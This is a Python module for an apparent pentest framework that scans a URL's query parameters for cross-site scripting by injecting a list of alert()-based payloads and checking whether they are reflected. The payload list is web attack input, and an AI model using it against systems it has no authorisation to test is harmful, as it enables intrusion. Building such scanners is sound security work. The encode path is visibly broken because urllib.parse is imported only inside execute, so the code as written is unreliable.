"""XSS Scanner Module.

Cross-Site Scripting (XSS) vulnerability scanner.
"""

import asyncio
import aiohttp
from typing import Any, Dict, List, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import re
from html import unescape

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)


# XSS payloads by type
XSS_PAYLOADS = {
    "reflected": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "'\"><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    ],
    "dom": [
        "#<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert(1)>",
    ],
    "attribute": [
        "' onload='alert(1)",
        "\" onload=\"alert(1)",
        "' onfocus='alert(1)' autofocus='",
        "\" onfocus=\"alert(1)\" autofocus=\"",
    ],
}


class XssScannerModule(AtsModule):
    """Cross-Site Scripting (XSS) vulnerability scanner."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="xss_scanner",
            category=ModuleCategory.PENTEST,
            description="Cross-Site Scripting (XSS) vulnerability scanner",
            version="1.0.0",
            parameters=[
                Parameter(
                    name="url",
                    type=ParameterType.URL,
                    description="Target URL to test",
                    required=True,
                ),
                Parameter(
                    name="payload_type",
                    type=ParameterType.CHOICE,
                    description="Type of XSS payloads to test",
                    required=False,
                    default="all",
                    choices=["all", "reflected", "dom", "attribute"],
                ),
                Parameter(
                    name="encode",
                    type=ParameterType.BOOLEAN,
                    description="Test URL-encoded payloads",
                    required=False,
                    default=False,
                ),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list", description="Found XSS vulnerabilities"),
                OutputField(name="summary", type="dict", description="Scan summary"),
            ],
            tags=["xss", "injection", "pentest", "web"],
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        url = config.get("url", "")
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else "" for k, v in params.items()}

    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """Build URL from base and parameters."""
        parsed = urlparse(base_url)
        query = urlencode(params)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment
        ))

    def _detect_xss(self, payload: str, response_text: str) -> Dict[str, Any]:
        """Detect if payload is reflected in response."""
        # Unescape HTML entities
        response_unescaped = unescape(response_text)

        # Check for direct reflection
        if payload in response_text or payload in response_unescaped:
            return {
                "reflected": True,
                "context": "direct",
                "evidence": self._extract_context(response_text, payload),
            }

        # Check for partial reflection (script tags)
        if "<script>" in payload:
            script_content = payload.replace("<script>", "").replace("</script>", "")
            if script_content in response_text:
                return {
                    "reflected": True,
                    "context": "partial",
                    "evidence": self._extract_context(response_text, script_content),
                }

        # Check for event handlers
        event_handlers = ["onload", "onerror", "onfocus", "onclick"]
        for handler in event_handlers:
            if handler in payload.lower() and handler in response_text.lower():
                return {
                    "reflected": True,
                    "context": "event_handler",
                    "evidence": self._extract_context(response_text, handler),
                }

        return {"reflected": False}

    def _extract_context(self, response: str, search_term: str, context_size: int = 100) -> str:
        """Extract context around the reflected payload."""
        try:
            pos = response.lower().find(search_term.lower())
            if pos != -1:
                start = max(0, pos - context_size)
                end = min(len(response), pos + len(search_term) + context_size)
                context = response[start:end]
                return context.replace("\n", " ").strip()
        except:
            pass
        return ""

    async def _test_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        payload: str,
        payload_type: str,
        encode: bool = False
    ) -> Dict[str, Any]:
        """Test a single XSS payload."""
        # Encode if requested
        test_payload = urllib.parse.quote(payload) if encode else payload

        # Inject payload
        params = self._extract_parameters(url)
        params[param_name] = test_payload

        test_url = self._build_url(url, params)

        try:
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=True
            ) as response:
                response_text = await response.text()

                # Detect XSS
                detection = self._detect_xss(payload, response_text)

                if detection.get("reflected"):
                    return {
                        "vulnerable": True,
                        "type": payload_type,
                        "payload": payload,
                        "parameter": param_name,
                        "url": test_url,
                        "context": detection.get("context"),
                        "evidence": detection.get("evidence"),
                        "encoded": encode,
                        "status_code": response.status,
                    }

        except Exception as e:
            self.logger.debug(f"Test failed: {e}")

        return {"vulnerable": False}

    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        payload_types: List[str],
        encode: bool
    ) -> List[Dict[str, Any]]:
        """Test all payloads on a single parameter."""
        vulnerabilities = []

        for payload_type in payload_types:
            payloads = XSS_PAYLOADS.get(payload_type, [])

            for payload in payloads:
                # Test normal
                result = await self._test_payload(
                    session, url, param_name, payload, payload_type, encode=False
                )

                if result.get("vulnerable"):
                    vulnerabilities.append(result)
                    self.logger.warning(
                        "xss_found",
                        param=param_name,
                        type=payload_type,
                        payload=payload[:50]
                    )
                    break

                # Test encoded if requested
                if encode:
                    result_encoded = await self._test_payload(
                        session, url, param_name, payload, payload_type, encode=True
                    )

                    if result_encoded.get("vulnerable"):
                        vulnerabilities.append(result_encoded)
                        self.logger.warning(
                            "xss_found_encoded",
                            param=param_name,
                            type=payload_type
                        )
                        break

            # If found with this type, continue to test other types
            # (a parameter can have multiple XSS contexts)

        return vulnerabilities

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        import urllib.parse

        url = config["url"]
        payload_type_selection = config.get("payload_type", "all")
        encode = config.get("encode", False)

        self.logger.info("starting_xss_scan", url=url)

        # Determine payload types
        if payload_type_selection == "all":
            payload_types = list(XSS_PAYLOADS.keys())
        else:
            payload_types = [payload_type_selection]

        # Get parameters to test
        all_params = self._extract_parameters(url)

        if not all_params:
            return {
                "vulnerabilities": [],
                "summary": {
                    "status": "error",
                    "message": "No query parameters found in URL"
                }
            }

        # Test each parameter
        all_vulnerabilities = []

        async with aiohttp.ClientSession() as session:
            for param_name in all_params.keys():
                self.logger.info("testing_parameter", param=param_name)

                vulns = await self._test_parameter(
                    session, url, param_name, payload_types, encode
                )

                all_vulnerabilities.extend(vulns)

        # Build summary
        summary = {
            "url": url,
            "parameters_tested": len(all_params),
            "vulnerabilities_found": len(all_vulnerabilities),
            "vulnerable_parameters": list(set(v["parameter"] for v in all_vulnerabilities)),
            "xss_types_detected": list(set(v["type"] for v in all_vulnerabilities)),
            "risk_level": "HIGH" if all_vulnerabilities else "NONE",
        }

        self.logger.info(
            "xss_scan_complete",
            url=url,
            vulns_found=len(all_vulnerabilities)
        )

        return {
            "vulnerabilities": all_vulnerabilities,
            "summary": summary,
            "tested_parameters": list(all_params.keys()),
            "payload_types_used": payload_types,
        }
